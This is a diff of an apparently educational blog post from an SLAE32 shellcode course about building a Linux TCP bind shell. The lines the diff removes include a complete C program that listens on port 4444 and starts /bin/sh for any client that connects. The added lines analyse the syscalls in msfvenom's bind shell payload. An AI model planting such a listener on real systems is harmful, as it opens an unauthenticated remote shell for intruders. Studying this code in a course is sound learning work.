@@ -6,59 +6,20 @@ tags: [assembly, c, python, exploit development, bind shell, linux, SLAE32]
 header:
     teaser: "/assets/images/slae/shell.jpg"
 ---
-A bind shell is a type of shell in which the system on which the code is run binds a TCP socket that is designated to listen for incoming connections to a specified port and IP address. When a bind shell is used, the system on which the bind shell is executed acts as the listener. When a connection is accepted on the bound and listening socket on the designated port and IP address, a shell will be spawned on the system on which the code is run. 
+## Shell Bind TCP Objectives
 
-To more fully understand the underlying system calls required to create a TCP bind shell written in assembly, it is logical to begin by analyzing a TCP bind shell written using a higher level language such as C. For this purpose, the C program shown in the proceeding (first) section of this document will instruct a system to listen on all available network interfaces for connections on TCP port 4444. When a connection is established, `/bin/sh` will be executed on the system and input and output will be redirected to the system that established the TCP connection. 
-
-After analysis of the C program is complete, the code can more easily be re-written in assembly. This processes is documented and explained in detail in the second section of this post. 
-
-Finally, the third section of this paper demonstrates a program written in Python that allows a user to configure a port number to be used in the Shell_Bind_TCP shellcode.
-
-## Objectives
 Create a Shell_Bind_TCP shellcode that;
 1. Binds to an easily configurable port number
 2. Executes a shell on an incoming connection
 
-## Analysis of Shell_Bind_TCP.c
-The following code has been commented in a way that aims to break the program down into distinct sections to be referenced during analysis. A brief explanation of each commented code section will be provided in this section of the post.
 
-```c
-#include <stdio.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
+A bind shell is a type of shell in which the system on which the code is run binds a TCP socket that is designated to listen for incoming connections to a specified port and IP address. When a bind shell is used, the system on which the bind shell is executed acts as the listener. When a connection is accepted on the bound and listening socket on the designated port and IP address, a shell will be spawned on the system on which the code is run. 
 
-int main ()
-{
-    /* Create a TCP Socket */
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    
-    /* Create an IP Socket Address Structure */
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(4444);
-    addr.sin_addr.s_addr = INADDR_ANY;
 
-    /* Bind TCP Socket to IP Socket Address Structure */
-    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+While analyzing shell_bind_tcp shellcode produced my msfvenom, it appears that a total of six syscalls are executed in sequential order. The order goes: socket, bind, listen, accept, dup2, and execve. Each serve a purpose in creating a bind shell. Let's analyze the first function in this payload. 
 
-    /* Designate Socket to Listen for Connection Requests */
-    listen(sockfd, 0);
+The socket or SYS_SOCKETCALL is syscall number 102 or 0x66.
 
-    /* Accept Connection Requests on the Socket */
-    int connfd = accept(sockfd, NULL, NULL);
-
-    /* Direct Connection Socket Output */
-    for (int i = 0; i < 3; i++)
-    {
-        dup2(connfd, i);
-    }
-
-    /* Execute Program */
-    execve("/bin/sh", NULL, NULL);
-    return 0;
-}
-```
 
 ### Create a TCP Socket
 `int socket(int domain, int type, int protocol);`
